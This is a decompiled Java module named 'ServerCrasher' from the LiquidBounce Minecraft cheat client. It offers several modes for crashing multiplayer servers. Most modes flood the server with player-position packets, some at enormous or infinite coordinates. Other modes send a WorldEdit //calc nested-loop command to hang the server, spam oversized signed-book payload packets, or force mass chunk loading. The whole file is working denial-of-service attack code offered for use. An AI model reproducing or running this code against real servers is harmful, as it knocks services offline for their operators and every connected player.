// 
// Decompiled by Procyon v0.5.36
// 

package net.ccbluex.liquidbounce.features.module.modules.exploit;

import net.ccbluex.liquidbounce.event.events.TickEvent;
import net.ccbluex.liquidbounce.event.EventTarget;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.ccbluex.liquidbounce.utils.misc.RandomUtils;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import net.ccbluex.liquidbounce.event.EventState;
import net.ccbluex.liquidbounce.event.events.MotionEvent;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C03PacketPlayer;
import joptsimple.internal.Strings;
import net.minecraft.client.audio.ISound;
import net.minecraft.client.audio.PositionedSoundRecord;
import net.minecraft.util.ResourceLocation;
import net.ccbluex.liquidbounce.features.command.Command;
import net.ccbluex.liquidbounce.LiquidBounce;
import net.ccbluex.liquidbounce.valuesystem.types.ListValue;
import net.ccbluex.liquidbounce.features.module.ModuleCategory;
import net.ccbluex.liquidbounce.features.module.ModuleInfo;
import net.ccbluex.liquidbounce.features.module.Module;

@ModuleInfo(name = "ServerCrasher", description = "Allows you to crash certain server.", category = ModuleCategory.EXPLOIT)
public class ServerCrasher extends Module
{
    private final ListValue modeValue;
    
    public ServerCrasher() {
        this.modeValue = new ListValue("Mode", new String[] { "AACNew", "AACOther", "AACOld", "WorldEdit", "BookFlood", "CubeCraft", "MassiveChunkLoading" }, "AACNew");
        LiquidBounce.CLIENT.commandManager.registerCommand(new Command("servercrasher", null) {
            @Override
            public void execute(final String[] args) {
                if (args.length <= 1 || !args[1].equalsIgnoreCase("mode")) {
                    this.chatSyntax(".servercrasher <mode>");
                    return;
                }
                if (args.length > 2 && ServerCrasher.this.modeValue.contains(args[2])) {
                    ServerCrasher.this.modeValue.setValue(args[2].toLowerCase());
                    this.chat("§7ServerCrasher mode was set to §8" + ServerCrasher.this.modeValue.asString().toUpperCase() + "§7.");
                    ServerCrasher$1.mc.func_147118_V().func_147682_a((ISound)PositionedSoundRecord.func_147674_a(new ResourceLocation("random.anvil_use"), 1.0f));
                    return;
                }
                this.chatSyntax(".servercrasher mode §c<§8" + Strings.join(ServerCrasher.this.modeValue.getValues(), "§7, §8") + "§c>");
            }
        });
    }
    
    @Override
    public void onEnable() {
        if (ServerCrasher.mc.field_71439_g == null) {
            return;
        }
        final String lowerCase = this.modeValue.asString().toLowerCase();
        switch (lowerCase) {
            case "aacnew": {
                for (int index = 0; index < 9999; ++index) {
                    ServerCrasher.mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(ServerCrasher.mc.field_71439_g.field_70165_t + 9412 * index, ServerCrasher.mc.field_71439_g.func_174813_aQ().field_72338_b + 9412 * index, ServerCrasher.mc.field_71439_g.field_70161_v + 9412 * index, true));
                }
                break;
            }
            case "aacother": {
                for (int index = 0; index < 9999; ++index) {
                    ServerCrasher.mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(ServerCrasher.mc.field_71439_g.field_70165_t + 500000 * index, ServerCrasher.mc.field_71439_g.func_174813_aQ().field_72338_b + 500000 * index, ServerCrasher.mc.field_71439_g.field_70161_v + 500000 * index, true));
                }
                break;
            }
            case "aacold": {
                ServerCrasher.mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                break;
            }
            case "worldedit": {
                ServerCrasher.mc.field_71439_g.func_71165_d("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
                break;
            }
            case "cubecraft": {
                ServerCrasher.mc.field_71439_g.func_70107_b(ServerCrasher.mc.field_71439_g.field_70165_t, ServerCrasher.mc.field_71439_g.field_70163_u + 0.3, ServerCrasher.mc.field_71439_g.field_70161_v);
                break;
            }
            case "massivechunkloading": {
                for (double yPos = ServerCrasher.mc.field_71439_g.field_70163_u; yPos < 255.0; yPos += 5.0) {
                    ServerCrasher.mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(ServerCrasher.mc.field_71439_g.field_70165_t, yPos, ServerCrasher.mc.field_71439_g.field_70161_v, true));
                }
                for (int i = 0; i < 6685; i += 5) {
                    ServerCrasher.mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(ServerCrasher.mc.field_71439_g.field_70165_t + i, 255.0, ServerCrasher.mc.field_71439_g.field_70161_v + i, true));
                }
                break;
            }
        }
    }
    
    @EventTarget
    public void onMotion(final MotionEvent event) {
        if (event.getEventState() == EventState.POST) {
            return;
        }
        final String lowerCase = this.modeValue.asString().toLowerCase();
        switch (lowerCase) {
            case "bookflood": {
                final ItemStack bookStack = new ItemStack(Items.field_151099_bA);
                final NBTTagCompound bookCompound = new NBTTagCompound();
                bookCompound.func_74778_a("author", RandomUtils.randomNumber(20));
                bookCompound.func_74778_a("title", RandomUtils.randomNumber(20));
                final NBTTagList pageList = new NBTTagList();
                final String pageText = RandomUtils.randomNumber(600);
                for (int page = 0; page < 50; ++page) {
                    pageList.func_74742_a((NBTBase)new NBTTagString(pageText));
                }
                bookCompound.func_74782_a("pages", (NBTBase)pageList);
                bookStack.func_77982_d(bookCompound);
                for (int packets = 0; packets < 100; ++packets) {
                    final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                    packetBuffer.func_150788_a(bookStack);
                    ServerCrasher.mc.func_147114_u().func_147297_a((Packet)new C17PacketCustomPayload(RandomUtils.getRandom().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
                }
                break;
            }
            case "cubecraft": {
                final double x = ServerCrasher.mc.field_71439_g.field_70165_t;
                final double y = ServerCrasher.mc.field_71439_g.field_70163_u;
                final double z = ServerCrasher.mc.field_71439_g.field_70161_v;
                for (int i = 0; i < 3000; ++i) {
                    ServerCrasher.mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(x, y + 0.09999999999999, z, false));
                    ServerCrasher.mc.func_147114_u().func_147297_a((Packet)new C03PacketPlayer.C04PacketPlayerPosition(x, y, z, true));
                }
                ServerCrasher.mc.field_71439_g.field_70181_x = 0.0;
                break;
            }
            default: {
                this.setState(false);
                break;
            }
        }
    }
    
    @EventTarget
    public void onTick(final TickEvent event) {
        if (ServerCrasher.mc.field_71439_g == null || ServerCrasher.mc.field_71441_e == null) {
            this.setState(false);
        }
    }
    
    @Override
    public String getTag() {
        return this.modeValue.asString();
    }
}
